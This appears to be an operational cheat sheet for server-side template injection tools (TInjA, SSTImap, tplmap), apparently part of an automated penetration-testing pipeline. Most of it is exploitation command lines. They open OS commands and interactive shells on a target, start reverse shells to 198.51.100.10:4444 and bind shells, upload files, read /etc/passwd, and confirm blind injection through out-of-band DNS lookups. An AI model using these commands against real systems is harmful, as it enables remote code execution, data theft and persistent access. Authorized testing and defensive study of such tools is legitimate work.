# SSTI Tooling — TInjA, SSTImap, tplmap

## TInjA (Go; ~44 engines; best detector/fingerprinter) — run first

Efficient polyglot-based detection with automatic engine fingerprinting; tests
query/body params, headers, cookies.

```
tinja url -u 'https://example.com/greet?name=John'
tinja url -u 'https://example.com/login' -d 'user=John&pass=x'      # POST body
tinja raw -r request.txt                                            # raw HTTP request file
tinja url -u '...' -H 'Authorization: Bearer eyJ...' -c 'sid=abc'   # auth
tinja url -u '...' --csti                                           # also client-side TI
tinja url -u '...' --reportpath ./tinja-report                      # JSONL report
```

Reads engines + confidence from output; the JSONL report is pipeline-friendly —
parse it and emit work units (one per confirmed param+engine) for SSTImap /
manual exploitation.

## SSTImap (Python 3, maintained tplmap fork) — exploit confirmed hits

```
python3 sstimap.py -u 'https://example.com/greet?name=John'          # detect, all params
python3 sstimap.py -u 'https://example.com/greet?name=John*'         # * = injection marker
python3 sstimap.py -u 'https://example.com/post' -d 'name=John*'     # POST
python3 sstimap.py -u '...' -e jinja2                                # force engine
python3 sstimap.py -u '...' --level 5                                # deeper contexts/escapes
python3 sstimap.py -u '...' --os-cmd 'id'                            # one-shot command
python3 sstimap.py -u '...' --os-shell                               # interactive pseudo-shell
python3 sstimap.py -u '...' --reverse-shell 198.51.100.10 4444
python3 sstimap.py -u '...' --upload local.sh /tmp/x.sh              # file upload
python3 sstimap.py -u '...' --download /etc/passwd ./passwd          # file read
python3 sstimap.py -u '...' -H 'Cookie: sid=abc' -A 'Mozilla/5.0'    # headers/UA
python3 sstimap.py --interactive                                     # REPL mode
```

Output reads like tplmap: it prints the detected engine, capabilities matrix
(`Shell command execution: ok`, `File write/read: ok`, blind yes/no), then the
requested action. "blind" means use OOB/time confirmation.

## tplmap (original, Python 2 era, unmaintained) — last resort

Same CLI shape; needs a py2 environment. Only useful when its specific plugin
chain happens to work where the forks fail.

```
./tplmap.py -u 'https://example.com/greet?name=John'
./tplmap.py -u '...' --os-shell
./tplmap.py -u '...' -d 'name=John' --engine jinja2
./tplmap.py -u '...' --bind-shell 4444 / --reverse-shell 198.51.100.10 4444
```

## Chaining

1. `tinja url -u ...` across all candidate endpoints (feed URL lists from
   crawl output) → parse report → work units.
2. `sstimap.py -u <unit url> -e <engine> --os-cmd id` → capability proof.
3. If sandbox blocks the tool chain → manual payloads from `exploitation.md`
   via Burp Repeater (Proxy history → right-click → Send to Repeater) or
   `mitmdump -s inject.py "~u /greet"` for scripted mutation.
4. Blind → interactsh: `interactsh-client -json -o oast.json`, inject
   `nslookup <id>.oast.pro` as the command, correlate hits by timestamp.

Every parse step ends in rupu output — see `rupu.md`.
